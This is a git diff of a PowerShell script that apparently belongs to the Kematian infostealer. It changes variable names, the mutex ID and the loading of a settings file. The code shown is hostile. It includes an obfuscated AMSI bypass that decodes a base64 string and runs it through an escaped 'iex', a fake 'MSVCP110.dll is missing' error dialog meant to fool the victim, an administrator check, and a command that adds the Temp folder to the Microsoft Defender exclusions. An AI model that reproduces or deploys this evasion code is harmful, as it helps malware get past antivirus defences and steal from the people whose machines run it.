@@ -9,7 +9,7 @@ $settings = $false
 
 if (Test-Path -Path "$env:APPDATA\Kematian\settings.ps1") {
     $settings = $true
-    "$env:APPDATA\Kematian\settings.ps1"
+    . "$env:APPDATA\Kematian\settings.ps1"
     if ($debug) {
         Write-Host "[!] Settings Loaded" -ForegroundColor Green
     }
@@ -27,7 +27,7 @@ $avatar = "https://i.imgur.com/DOIYOtp.gif"
 
 function KDMUTEX {
     if ($fakeerror ) { Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show("The program can't start because MSVCP110.dll is missing from your computer. Try reinstalling the program to fix this problem.", '', 'OK', 'Error') }
-    $AppId = "a0e59cd1-5d22-4ae1-967b-1bf3e1d36d6b" 
+    $AppId = "a77dff94-5f71-4c3d-b0e4-952b0852179b" 
     $CreatedNew = $false
     $script:SingleInstanceEvent = New-Object Threading.EventWaitHandle $true, ([Threading.EventResetMode]::ManualReset), "Global\$AppID", ([ref] $CreatedNew)
     if ( -not $CreatedNew ) { throw "[!] An instance of this script is already running." }
@@ -69,11 +69,12 @@ public static class ProcessUtility
 
 # Request admin with AMSI bypass
 function CHECK_AND_PATCH {
-    ${kDOt} = [Ref].Assembly.GetType('System.Management.Automation.Am' + 'siUtils').GetField('am' + 'siInitFailed', 'NonPublic,Static');
-    ${CHaINSki} = [Text.Encoding]::ASCII.GetString([Convert]::FromBase64String("JGtkb3QuU2V0VmFsdWUoJG51bGwsJHRydWUp")) | &([regex]::Unescape("\u0069\u0065\u0078"))
-    $kdotcheck = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
-    return $kdotcheck
+    ${kematian} = [Ref].Assembly.GetType('System.Management.Automation.Am' + 'siUtils').GetField('am' + 'siInitFailed', 'NonPublic,Static');
+    ${CHaINSki} = [Text.Encoding]::ASCII.GetString([Convert]::FromBase64String("JGtlbWF0aWFuLlNldFZhbHVlKCRudWxsLCR0cnVlKQ==")) | &([regex]::Unescape("\u0069\u0065\u0078"))
+    $kematiancheck = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
+    return $kematiancheck
 }
+
 
 function Invoke-TASKS {
     Add-MpPreference -ExclusionPath "$env:LOCALAPPDATA\Temp" -Force
